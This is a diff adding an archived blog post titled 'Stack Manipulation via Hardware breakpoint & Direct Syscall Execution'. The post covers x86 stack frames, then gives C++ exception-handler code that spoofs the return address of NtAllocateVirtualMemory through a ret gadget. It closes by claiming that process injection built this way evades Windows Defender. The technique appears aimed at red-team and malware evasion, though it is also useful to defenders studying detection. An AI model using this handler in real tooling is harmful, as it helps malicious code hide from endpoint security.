@@ -1,0 +1,400 @@
+# https://sabotagesec.com/stack-manipulation-via-hardware-breakpoint-direct-syscall-execution/
+
+<!DOCTYPE html><html lang="en-US">
+
+<body class="post-template-default single single-post postid-1340 single-format-standard wp-embed-responsive">
+
+<div class="wp-site-blocks">
+
+
+<main class="wp-block-group is-layout-flow wp-block-group-is-layout-flow">
+    
+    <div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
+        
+        <h2 class="wp-block-post-title">Stack Manipulation via Hardware breakpoint &amp; Direct Syscall Execution</h2>
+    </div>
+    <div class="entry-content wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
+<p></p>
+
+
+
+<h2 class="wp-block-heading">x86 Stack Primer</h2>
+
+
+
+<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="624" src="https://sabotagesec.com/wp-content/uploads/2023/09/mod2_winArch-2-1024x624.png" alt="" class="wp-image-1342"></figure>
+
+
+
+<p>In this section we will quickly go over x86 stack working. The scenario is main() calls function A(), then A() calls B(). Lets see how this affects the stack. The above image is very generic in nature and calling convention is not taken into consideration.</p>
+
+
+
+<ul class="wp-block-list">
+<li>Simple rule is state of the stack should be restored to state previous to the function call. The should be equal number of “pop” to the number of “push” instructions executed by the function to restore the state. For this reason there are many calling conventions like __cdecl and __stdcall. The windows API follow stdcall convention. Meaning “stack cleaning” or state restoration is the responsibility of the callee. Hence we see RET XX in win32 api disassembly.</li>
+
+
+
+<li>Before program executes a call instruction, it pushes the arguments (right to left) on to the stack. The first argument value will be the last item that gets pushed to the stack(again depends on calling convention, here we assume its stdcall).</li>
+
+
+
+<li>Now its time to execute the CALL instruction. Interestingly this instruction simply pushes the address of the instruction on the stack and jumps to the address of the target function by placing it in the EIP. This is how the system knows where to transfer control after finishing execution of the function. Now the function can access all of the parameter values from the stack, that are pushed by the caller.</li>
+
+
+
+<li>Whenever things get pushed to the stack, the ESP value changes, there needs to be a standard mechanism to keep track of the contents of the stack. Since ESP is very volatile in nature, we use EBP register to keep track of functions. These are called “frames”. The frames are logical boundaries set in the stack to identify a specific function. All the data within a frame belongs to a function. This way we can easily make a stack trace and see the call sequence by simply parsing the EBP chain.</li>
+
+
+
+<li>This is the main reason why all x86 functions have its signature prologue and epilogue as shown below.</li>
+</ul>
+
+
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate" title="">//Prologue
+push    ebp
+mov     ebp, esp
+
+//Epilogue
+mov esp, ebp
+pop ebp
+ret                ;ret xx 
+</pre></div>
+
+
+<ul class="wp-block-list">
+<li>Right after the call instruction the ESP will be pointing to the return address, the first thing that callee does is to execute the prologue, it pushes(preserves frame pointer of caller, A()) the value in the EBP to the stack and this increments the ESP by 4 bytes and move this new address in stack to EBP. From now on this serves as the base of the stack and we don’t need ESP to keep track of the state of the stack.</li>
+
+
+
+<li>This is called EBP based referencing. Now [EBP+XX] can access parameter values from the stack and [EBP-XX] can access data local to the function.</li>
+
+
+
+<li>When function exits, it executes the epilogue which reverses the effect of the prologue. After execution of “pop” the ESP will point to our return address and ret instruction will simply put return address in the EIP and thus the control gets transferred to caller A(). The value returned by the callee B() will be present in EAX. In case of “ret xx”, the process is same as mentioned below, difference is the callee simply adds the xx value to the ESP and cleans the stack. The xx value is computed by the compiler based on the stack sized required by the function based on the its data. The stack clean up is dictated by the calling convention.</li>
+</ul>
+
+
+
+<h2 class="wp-block-heading">Process Overview</h2>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="422" src="https://sabotagesec.com/wp-content/uploads/2023/09/mod2_winArch-6-1024x422.png" alt="" class="wp-image-1354"></figure>
+
+
+
+<ul class="wp-block-list">
+<li>We will make use of Vectored Exception Handling to define a custom exception handler to perform the stack manipulation.</li>
+
+
+
+<li>We need a trigger to invoke our handler, which is going to be a hardware based breakpoint set on function we want to execute. Lets target assembly stub of NtAllocateVirtualMemory in ntdll.dll module.</li>
+
+
+
+<li>Following exception handling, the execution will resume normally but NtAllocateVirtualMemory gets executed with a spoofed address. </li>
+</ul>
+
+
+
+<h2 class="wp-block-heading">Spoofing return address</h2>
+
+
+
+<p>Below image shows the state of the stack when NtAllocateVirtualMemory gets directly called from the main(). We can see the arguments passed to the API and the the return address stored in the ESP.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="752" height="366" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-180417.png" alt="" class="wp-image-1346"></figure>
+
+
+
+<p>Its time to do some stack manipulation, we will modify the items on the stack from our exception handler. </p>
+
+
+
+<ul class="wp-block-list">
+<li>First find a gadget, lets hunt for a simple “ret” in kernel32.dll.</li>
+</ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="821" height="64" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-203743.png" alt="" class="wp-image-1355"></figure>
+
+
+
+<ul class="wp-block-list">
+<li>There is no specific reason but I am just going for “ret 50” as shown above.</li>
+
+
+
+<li>For this to work, we need to allocate enough space on the stack which is in our case 0x50 .</li>
+
+
+
+<li>When we hit H/W BP on the NtAllocateVirtualMemory assembly stub, the state of the stack is that the esp points to the original return address which is our main(). The system registers are accessible through the context structure passed to our handler routine. </li>
+
+
+
+<li>To spoof the return address, we need to setup the stack as shown below.</li>
+</ul>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="680" src="https://sabotagesec.com/wp-content/uploads/2023/09/mod2_winArch-4-1024x680.png" alt="" class="wp-image-1345"></figure>
+
+
+
+<p>Lets do the spoofing!</p>
+
+
+
+<ul class="wp-block-list">
+<li>Increase the stack size by 50, by subtracting the ESP value by 0x50.</li>
+
+
+
+<li>Copy the stack items over to new stack.</li>
+
+
+
+<li>Place the original return address to main() at exact position shown in the image above following the api arguments.</li>
+
+
+
+<li>Finally we can replace the ESP value which is the top with address of our gadget. Now the stack looks exactly as the image shown above. The modified state of the stack is shown below.</li>
+</ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="788" height="340" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-180945.png" alt="" class="wp-image-1347"></figure>
+
+
+
+<p>Following the execution of NtAllocateVirtualMemory, the control goes to our gadget as shown below.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="626" height="49" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-181141.png" alt="" class="wp-image-1348"></figure>
+
+
+
+<p>And finally back to our main() as shown below :). </p>
+
+
+
+<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-181221.png" alt="" class="wp-image-1349" width="619" height="133"></figure>
+
+
+
+<p>The call to the api was a success as we can see the newly allocated RWX region as shown below.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="948" height="368" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-181326.png" alt="" class="wp-image-1350"></figure>
+
+
+
+<p>And here is the stack trace for the main thread!</p>
+
+
+
+<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-181816.png" alt="" class="wp-image-1352" width="612" height="400"></figure>
+
+
+
+<h2 class="wp-block-heading">Handler Code</h2>
+
+
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate" title="">#define STACK_ARGS_LENGTH 5 //total number of args - 1
+
+LONG HWSpoofHandler(EXCEPTION_POINTERS* ExceptionInfo) 
+{
+   
+   
+    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) 
+    {
+        if (ExceptionInfo-&gt;ContextRecord-&gt;Eip == (DWORD64)&amp;BreakOnSyscall) 
+        {
+            
+           
+            ntSyscallStub = CustomGetProc((UINT64)hNtdll, (char*)*(DWORD*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp + 4));
+
+            // Move breakpoint to the NTAPI function;
+            ExceptionInfo-&gt;ContextRecord-&gt;Dr0 = ntSyscallStub ;
+
+
+            
+        }
+        else if (ExceptionInfo-&gt;ContextRecord-&gt;Eip == (DWORD64)ntSyscallStub )
+        {
+           
+           
+            ExceptionInfo-&gt;ContextRecord-&gt;Esp -= 0x50;
+           
+           
+            
+            // Copy the stack arguments from the original stack
+            for (size_t i = 0; i &lt; STACK_ARGS_LENGTH; i++)
+            {
+                const size_t offset = i * STACK_ARGS_LENGTH;
+                *(DWORD64*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp + offset) = *(DWORD64*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp + offset + 0x50);
+               
+            }
+//Pushing Original return address after last argument
+            *(DWORD*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp + (4 * STACK_ARGS_LENGTH + 8)) = *(DWORD*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp);
+ //Pushing Gadget address on top          
+            *(DWORD*)(ExceptionInfo-&gt;ContextRecord-&gt;Esp) = retGadgetAddress;
+           
+            ExceptionInfo-&gt;ContextRecord-&gt;Eip = ntSyscallStub ;
+           
+
+
+            ExceptionInfo-&gt;ContextRecord-&gt;Dr0 = (UINT64)&amp;BreakOnSyscall;
+        }
+        return EXCEPTION_CONTINUE_EXECUTION;
+
+        
+    }
+    
+    return EXCEPTION_CONTINUE_SEARCH;
+    
+}
+</pre></div>
+
+
+<h2 class="wp-block-heading">Defender doesnt care!</h2>
+
+
+
+<p>A classic vanilla process injection flies under the radar of defender with this vector.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="561" src="https://sabotagesec.com/wp-content/uploads/2023/09/Screenshot-2023-09-03-230412-1024x561.png" alt="" class="wp-image-1357"></figure>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+
+
+
+<p></p>
+</div>
+    
+    <div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
+        <div class="wp-block-template-part">
+<div class="wp-block-group is-layout-flow wp-block-group-is-layout-flow">
+    
+    <div class="wp-block-group is-layout-flex wp-block-group-is-layout-flex">
+        <div style="font-size:14px" class="taxonomy-category wp-block-post-terms"><a href="https://sabotagesec.com/category/offensive-coding/" rel="tag">Offensive Coding</a></div>
+    </div>
+    
+
+    
+    <div class="wp-block-group is-nowrap is-layout-flex wp-container-core-group-is-layout-7 wp-block-group-is-layout-flex">
+        <div style="font-size:14px;text-transform:lowercase" class="taxonomy-post_tag wp-block-post-terms"><a href="https://sabotagesec.com/tag/c-2/" rel="tag">c++</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/cyber-security/" rel="tag">cyber security</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/malware/" rel="tag">Malware</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/redteam/" rel="tag">redteam</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/return-address-spoofing/" rel="tag">return address spoofing</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/spoofing/" rel="tag">spoofing</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/threat-research/" rel="tag">threat research</a><span class="wp-block-post-terms__separator">, </span><a href="https://sabotagesec.com/tag/windows/" rel="tag">Windows</a></div>
+    </div>
+    
+</div>
+
+</div>
+        
+        <div style="height:3rem" aria-hidden="true" class="wp-block-spacer"></div>
+        
+        
+
+<div class="wp-block-comments wp-block-comments-query-loop">
+
+
+
+
+
+	<div id="respond" class="comment-respond wp-block-post-comments-form">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://sabotagesec.com/stack-manipulation-via-hardware-breakpoint-direct-syscall-execution/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://sabotagesec.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required=""></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required=""></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required=""></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" autocomplete="url"></p>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<p class="form-submit wp-block-button"><input name="submit" type="submit" id="submit" class="wp-block-button__link wp-element-button" value="Post Comment"> 
+
+</p></form>	</div><!-- #respond -->
+	</div>
+
+
+    </div>
+    
+</main>
+
+
+
+</div>
+</body></html>
